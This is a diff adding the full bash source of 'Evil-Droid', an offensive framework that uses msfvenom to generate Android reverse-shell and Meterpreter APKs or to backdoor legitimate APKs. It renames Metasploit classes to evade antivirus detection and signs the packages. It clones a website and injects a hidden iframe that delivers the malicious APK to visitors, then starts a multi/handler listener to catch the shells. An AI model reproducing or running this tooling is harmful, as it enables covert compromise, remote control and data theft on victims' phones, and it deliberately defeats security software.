@@ -1,0 +1,566 @@
+#!/usr/bin/env bash
+#
+# Evil-Droid Framework . version 0.1
+# Evil-Droid is a framework that create & generate & embed apk payload to penetrate androis-os
+# 
+#                  Created By Mascerano Bachir .
+#                 Website: http://www.dev-labs.co
+#           YTB : https://www.youtube.com/c/mascerano%20bachir  
+#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
+#Speciak thanks to : MrPedroubuntu , Kader Achraf and Mohammed Yacine
+#
+# this is an open source tool if you want to modify or add something . Please give me a copy.
+
+# resize terminal window
+resize -s 38 70 > /dev/null
+#Colors
+cyan='\e[0;36m'
+lightcyan='\e[96m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+Escape="\033";
+white="${Escape}[0m";
+RedF="${Escape}[31m";
+GreenF="${Escape}[32m";
+LighGreenF="${Escape}[92m"
+YellowF="${Escape}[33m";
+BlueF="${Escape}[34m";
+CyanF="${Escape}[36m";
+Reset="${Escape}[0m";
+# Check root
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
+clear
+# check internet 
+function checkinternet() 
+{
+  ping -c 1 google.com > /dev/null 2>&1
+  if [[ "$?" != 0 ]]
+  then
+    echo -e $yellow " Checking For Internet: ${RedF}FAILED"
+    echo
+    echo -e $red "This Script Needs An Active Internet Connection"
+    echo
+    echo -e $yellow " Evil-Droid Exit"
+    echo && sleep 2
+    exit
+  else
+    echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
+  fi
+}
+checkinternet
+sleep 2
+#Define options
+path=`pwd`
+lanip=`ip route get 1 | awk '{print $NF;exit}'`
+publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
+ver="v0.1"
+VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
+VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
+VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
+VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
+VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
+VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+echo ""
+sleep 1
+# spinner for Metasploit Generator
+spinlong ()
+{
+    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
+}
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
+echo -e $red"[*] Stopping Services... "
+apache_svc_stop
+postgresql_stop
+sleep 1
+echo ""
+echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
+exit
+}
+#detect system
+echo -e $blue
+sudo cat /etc/issue.net
+#check dependencies existence
+echo -e $blue "" 
+echo "® Checking dependencies configuration ®" 
+echo "                                       " 
+# check if metasploit-framework is installed
+which msfconsole > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
+which msfconsole > /dev/null 2>&1
+sleep 2
+else
+echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
+echo -e $yellow "[ ! ] Installing Metasploit-Framework "
+sudo apt-get install metasploit-framework -y
+echo -e $blue "[ ✔ ] Done installing ...."
+which msfconsole > /dev/null 2>&1
+sleep 2
+fi
+#check if xterm is installed
+which xterm > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
+which xterm > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] xterm -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Xterm "
+sleep 2
+echo -e $green ""
+sudo apt-get install xterm -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which xterm > /dev/null 2>&1
+fi
+#check if zenity is installed
+which zenity > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
+which zenity > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] Zenity -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Zenity "
+sleep 2
+echo -e $green ""
+sudo apt-get install zenity -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which zenity > /dev/null 2>&1
+fi
+#Check for Android Asset Packaging Tool
+which aapt > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ found ]"
+which aapt > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] Aapt -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Aapt "
+sleep 2
+echo -e $green ""
+sudo apt-get install aapt -y
+sudo apt-get install android-framework-res -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which aapt > /dev/null 2>&1
+fi
+#Check for Apktool Reverse Engineering
+which apktool > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ found ]"
+which aapt > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] Apktool -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Apktool "
+sleep 2
+echo -e $green ""
+sudo apt-get install apktool -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which apktool > /dev/null 2>&1
+fi
+directory="$path/evilapk"
+if [ ! -d "$directory" ]; then
+	echo "Creating the output directory..."
+	mkdir $directory
+        sleep 3
+fi
+echo -e $red "╔────────────────────────────────────────────────╗"
+echo -e $red "|    Evil-Droid Framework $ver - Dev-labs.co     |"
+echo -e $red "|   Please do not upload APK to VirusTotal.com   |"
+echo -e $red "┖────────────────────────────────────────────────┙"
+#function ascii banner
+function print_ascii_art {
+echo -e $lightgreen "             .           .           "          
+echo -e $lightgreen "             M.          .M          "     
+echo -e $lightgreen "              MMMMMMMMMMM.           "     
+echo -e $lightgreen "           .MMM\MMMMMMM/MMM.         "     
+echo -e $lightgreen "          .MMM.7MMMMMMM.7MMM.        "     
+echo -e $lightgreen "         .MMMMMMMMMMMMMMMMMMM        "     
+echo -e $lightgreen "         MMMMMMM.......MMMMMMM       "     
+echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "     
+echo -e $lightgreen "    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
+echo -e $lightgreen "    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "   
+echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
+echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
+echo -e $lightgreen "             MMMMM   MMMMM  $ver     "   
+echo -e $lightgreen "             MMMMM   MMMMM           "   
+echo -e $lightgreen "             MMMMM   MMMMM           "   
+echo -e $lightgreen "             MMMMM   MMMMM           "   
+echo -e $lightgreen "             .MMM.   .MMM.           " 
+echo -e $lightgreen "     Mascerano Bachir - Dev-labs     "                                 
+}
+#function lhost
+function get_lhost() 
+{
+  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+}
+#function lport
+function get_lport() 
+{
+  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+}
+#function payload
+function get_payload()
+{
+  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+}
+#function name
+function payload_name()
+{
+ apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
+}
+#function original apk
+function orig_apk()
+{
+ orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
+}
+#function generate payload
+function gen_payload()
+{
+ echo -e $yellow ""
+ echo "[*] Generating apk payload"
+ spinlong
+ xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+}
+function embed_payload()
+{
+ echo -e $yellow ""
+ echo "[*] Embeding apk payload in orginal apk"
+ spinlong
+ xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+}
+#function apktool
+function apk_decomp()
+{
+ echo -e $yellow ""
+ echo "[*] Decompiling APK file..."
+ spinlong
+ xterm -T "Decompiling APK" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
+ rm $apk_name.apk
+}
+function apk_comp()
+{
+ echo -e $yellow ""
+ echo "[*] Rebuilding APK file..."
+ spinlong
+ xterm -T "Rebuilding APK" -e apktool b $path/payload > /dev/null 2>&1
+ mv payload/dist/$apk_name.apk $path
+ rm -r payload
+}
+#function apache2 service
+function apache_svc_start()
+{
+ service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function apache_svc_stop()
+{
+ service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+#function postgresql service
+function postgresql_start()
+{
+ service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function postgresql_stop()
+{
+ service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+#function flagged by av & updating smalies
+function flagg()
+{
+ echo -e $yellow ""
+ echo "[*] Scrubbing the payload contents to avoid AV signatures..."
+ spinlong
+ mv payload/smali/com/metasploit payload/smali/com/$VAR1
+ mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
+ mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+ sleep 2
+ if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
+    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
+    exit 1
+ fi
+ sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
+ sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
+ sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+ sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+ sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
+ sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
+ sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
+ sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
+ sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
+}
+#function signing apk
+function sign()
+{
+ echo -e $yellow ""
+ echo "[*] Checking for ~/.android/debug.keystore for signing..."
+ spinlong
+ if [ ! -f ~/.android/debug.keystore ]; then
+     echo -e $red ""
+     echo " [ X ] Debug key not found. Generating one now..."
+     spinlong
+     if [ ! -d "~/.android" ]; then
+       mkdir ~/.android > /dev/null 2>&1
+     fi
+     echo -e $lightgreen ""
+     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
+ fi
+ spinlong
+ echo -e $yellow ""
+ echo "[*] Attempting to sign the package with your android debug key"
+ spinlong
+ jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $apk_name.apk androiddebugkey > /dev/null 2>&1
+ echo -e $yellow 
+ echo "[*] Verifying signed artifacts..."
+ spinlong
+ jarsigner -verify -certs $apk_name.apk > /dev/null 2>&1
+ rc=$?
+ echo -e $yellow
+ echo "[✔] Done."
+ spinlong
+ if [ $rc != 0 ]; then
+   echo "[!] Failed to verify signed artifacts"
+   exit $rc
+ fi
+}
+#function ask
+function quests()
+{
+while true; do
+   echo ""
+   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
+   case $quest in
+   APK-MSF) spinlong;gen_payload;spinlong;apk_decomp;flagg;spinlong;apk_comp;spinlong;sign;return;;
+   ORIGINAL-APK) orig_apk;spinlong;embed_payload;return;;
+   esac
+done
+}
+#function listeners
+function listener()
+{
+  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
+}
+#function clone site
+function clns()
+{
+ clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --width 400 2> /dev/null)
+}
+function index_name()
+{
+ index=$(zenity --title "☢ INDEX NAME ☢" --text "example: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
+ echo -e $yellow ""
+ echo "[*] Clone Website From URL..."
+ spinlong
+ wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
+}
+function launcher()
+{
+ echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
+ com=`cat apk_index`
+ rep="</body></html>"
+ sed "s|$rep|$com|" $index.html > index2.html
+ mv index2.html /var/www/html/$index.html > /dev/null 2>&1
+ cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
+ rm apk_index > /dev/null 2>&1
+ rm $index.html > /dev/null 2>&1
+ zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
+}
+#function attack verctor
+function atkv()
+{
+while true; do
+   echo ""
+   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   case $atk_v in
+   Multi-Handler) listener;suite;;
+   Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
+   Main-Menu) clear;main;;
+   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
+   esac
+done
+}
+#function suite
+function suite()
+{
+while true; do
+   echo ""
+   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   case $suit in
+   Main-Menu) clear;main;;
+   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
+   esac
+done
+}
+#function clean files
+function clean()
+{
+ rm $directory/* > /dev/null 2>&1
+ rm $path/*.jpeg > /dev/null 2>&1
+ rm $path/*.txt > /dev/null 2>&1
+ rm /var/www/html/*.apk > /dev/null 2>&1
+ rm /var/www/html/$index.html > /dev/null 2>&1
+}      
+start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
+  if [ "$?" -eq "0" ]; then
+    apache_svc_start
+    postgresql_start
+  else
+    clear
+    echo ""
+    echo -e $lightgreen "╔──────────────────────────────────────────────╗"
+    echo -e $lightgreen "|           Author: Mascerano Bachir           |"
+    echo -e $lightgreen "|    Evil-Droid Framework $ver - Dev-labs.co   |"
+    echo -e $lightgreen "|   Credits to : MrPedroubuntu , Kader Achraf  |"
+    echo -e $lightgreen "|              and Mohammed Yacine             |"
+    echo -e $lightgreen "┖──────────────────────────────────────────────┙"
+    echo ""
+    apache_svc_stop
+    postgresql_stop
+    exit
+  fi
+clear
+#main menu
+function main()
+{
+    while :
+    do
+
+        print_ascii_art
+        echo -e $green ""
+        echo "╔──────────────────────────────────────────────╗"
+        echo "|          Evil-Droid Framework $ver           |"
+        echo "|      Hack & Remote android plateform         |"
+        echo "┖──────────────────────────────────────────────┙"
+        echo "[1] APK MSF                                     "
+        echo "[2] BACKDOOR APK ORIGINAL                       "
+        echo "[3] BYPASS AV APK                               "
+        echo "[4] START LISTENER                              "
+        echo "[c] CLEAN                                       "
+        echo "[q] QUIT                                        "
+        read -p "[?] Select>: " option
+        echo
+        
+        case "$option" in 
+            1)  echo -e $lightgreen "[✔] APK MSF"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                payload_name
+                get_payload
+                echo
+                spinlong
+                gen_payload
+                mv $apk_name.apk $path/evilapk
+                sleep 2
+                echo ""
+                zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                atkv
+                echo
+                ;;
+            2)  echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                payload_name
+                get_payload
+                echo
+                orig_apk
+                echo
+                spinlong
+                embed_payload
+                mv $apk_name.apk $path/evilapk
+                sleep 2
+                echo ""
+                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                atkv 
+                echo
+                ;;
+            3)  echo -e $lightgreen "[✔] BYPASS AV APK"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                payload_name
+                get_payload
+                echo
+                quests
+                mv $apk_name.apk $path/evilapk
+                sleep 2
+                echo 
+                zenity --title "☢ EVIL-DROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
+                atkv 
+                echo
+                ;;
+            4)  echo -e $lightgreen "[✔] START LISTENER"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                listener
+                suite 
+                echo
+                ;;
+            c)  echo -e $lightgreen "[✔] clean up all files"
+                echo
+                clean
+                echo
+                zenity --title "☢ EVIL-DROID ☢" --info --text "All Files Are Removed " --width 400 > /dev/null 2>&1
+                echo
+                clear
+                ;;
+            q)  echo -e $yellow " Good Bye !!"
+                apache_svc_stop
+                postgresql_stop
+                echo
+                exit 0 
+                ;;
+            *)  echo -e $red  "【X】 Invalid option, please write a valid number【X】"
+                echo
+                sleep 2
+                ;;
+        esac
+    done
+}
+main
+
